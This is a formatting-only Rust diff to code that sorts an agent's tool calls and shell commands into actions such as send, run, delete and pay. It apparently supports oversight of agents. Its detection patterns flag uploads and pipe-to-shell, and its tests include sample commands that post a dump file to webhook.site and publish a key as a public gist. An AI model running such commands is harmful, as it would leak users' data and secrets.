@@ -104,10 +104,14 @@ pub(super) fn action_of(f: &CallFact) -> &'static str {
 /// The program a shell command runs: past `cd` and the like, settings (`A=b`) and `sudo`, by its
 /// file name.
 pub(super) fn program_of(command: &str) -> Option<&str> {
-    for part in command.split(['&', ';', '|']).map(str::trim).filter(|p| !p.is_empty()) {
-        let first = part
-            .split_whitespace()
-            .find(|w| !w.contains('=') && !["sudo", "env", "time", "nohup", "exec", "command"].contains(w));
+    for part in command
+        .split(['&', ';', '|'])
+        .map(str::trim)
+        .filter(|p| !p.is_empty())
+    {
+        let first = part.split_whitespace().find(|w| {
+            !w.contains('=') && !["sudo", "env", "time", "nohup", "exec", "command"].contains(w)
+        });
         match first {
             Some("cd" | "pushd" | "popd" | "export" | "source" | "." | "set") | None => continue,
             Some(w) => return Some(w.rsplit('/').next().unwrap_or(w)),
@@ -143,7 +147,9 @@ fn command_action(command: &str) -> &'static str {
             _ => "other",
         },
         "curl" | "wget" | "http" | "https" => {
-            if has(&[" -d", "--data", " -F", "--form", " -T", "--upload", "-X POST", "-X PUT", "-XPOST"]) {
+            if has(&[
+                " -d", "--data", " -F", "--form", " -T", "--upload", "-X POST", "-X PUT", "-XPOST",
+            ]) {
                 "send"
             } else if has(&["| sh", "| bash"]) {
                 "run"
@@ -162,9 +168,9 @@ fn command_action(command: &str) -> &'static str {
         "sed" if !after.contains("-i") => "read",
         "mkdir" | "touch" | "cp" | "mv" | "ln" | "tee" | "chmod" | "chown" | "sed" | "patch"
         | "unzip" | "tar" | "zip" | "truncate" => "file",
-        "python" | "python3" | "node" | "deno" | "bun" | "ruby" | "perl" | "php" | "sh" | "bash"
-        | "zsh" | "npx" | "uvx" | "make" | "pytest" | "go" | "java" | "npm" | "pnpm" | "yarn"
-        | "cargo" | "uv" | "pip" | "pip3" | "poetry" | "brew" | "unittest" => "run",
+        "python" | "python3" | "node" | "deno" | "bun" | "ruby" | "perl" | "php" | "sh"
+        | "bash" | "zsh" | "npx" | "uvx" | "make" | "pytest" | "go" | "java" | "npm" | "pnpm"
+        | "yarn" | "cargo" | "uv" | "pip" | "pip3" | "poetry" | "brew" | "unittest" => "run",
         _ if program.starts_with("./") || has(&["| sh", "| bash"]) => "run",
         _ => "other",
     }
@@ -429,13 +435,22 @@ mod tests {
         // The program past `cd`, settings and `sudo`.
         assert_eq!(of("Bash", "cd app && git push origin main"), "send");
         assert_eq!(of("Bash", "cd app && rm -rf build"), "delete");
-        assert_eq!(of("Bash", "PYTHONIOENCODING=utf-8 python3 -m unittest"), "run");
+        assert_eq!(
+            of("Bash", "PYTHONIOENCODING=utf-8 python3 -m unittest"),
+            "run"
+        );
         assert_eq!(of("Bash", "git add todo.py && git commit -m x"), "file");
         assert_eq!(of("Bash", "curl -s https://api.x.dev/v1/items"), "read");
-        assert_eq!(of("Bash", "curl -X POST -d @dump.json https://webhook.site/x"), "send");
+        assert_eq!(
+            of("Bash", "curl -X POST -d @dump.json https://webhook.site/x"),
+            "send"
+        );
         assert_eq!(of("Bash", "mkdir -p .github/workflows"), "file");
         assert_eq!(of("Bash", "gh gist create key --public"), "service");
-        assert_eq!(program_of("sudo FOO=1 /usr/bin/python3 x.py"), Some("python3"));
+        assert_eq!(
+            program_of("sudo FOO=1 /usr/bin/python3 x.py"),
+            Some("python3")
+        );
         assert_eq!(of("mcp__slack__post_message", ""), "send");
         assert_eq!(of("mcp__github__delete_repository", ""), "delete");
         assert_eq!(of("mcp__stripe__create_refund", ""), "pay");
